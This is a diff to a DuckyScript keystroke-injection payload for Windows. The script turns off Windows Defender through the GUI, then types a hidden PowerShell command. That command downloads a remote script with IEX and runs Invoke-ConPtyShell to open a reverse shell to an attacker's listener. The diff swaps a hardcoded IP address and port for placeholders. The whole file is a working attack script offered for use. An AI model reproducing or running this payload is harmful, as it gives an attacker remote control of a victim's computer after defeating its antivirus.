@@ -5,8 +5,8 @@ REM Purpose: Execute a reverse shell using Netcat
 REM Target: Windows environment 
 REM Notes:
 REM - This script temporarily disables Windows Defender through the GUI to ensure uninterrupted execution of PowerShell commands.                                                  
-REM - A public server is required to host the PowerShell script.                                                 
-REM - Refer to https://github.com/antonioCoco/ConPtyShell for the project's documentation for implementation details. 
+REM - A public server is required to host the PowerShell script and netcat listening enabled                                                 
+REM - Refer to https://github.com/antonioCoco/ConPtyShell or Netcat for the project's documentation for implementation details. 
 
 REM Disable Windows Defender AV
 GUI S
@@ -37,6 +37,6 @@ DELAY 200
 REM Launch Netcat to listener
 GUI R
 DELAY 400
-STRING powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest 'http://<url / ip address>/windows-nc-rs.ps1' -UseBasicParsing).Content; Invoke-ConPtyShell 101.99.74.214 87"
+STRING powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest 'http://<url / ip address>/windows-nc-rs.ps1' -UseBasicParsing).Content; Invoke-ConPtyShell <netcat listener ip> <port>"
 DELAY 400
 ENTER
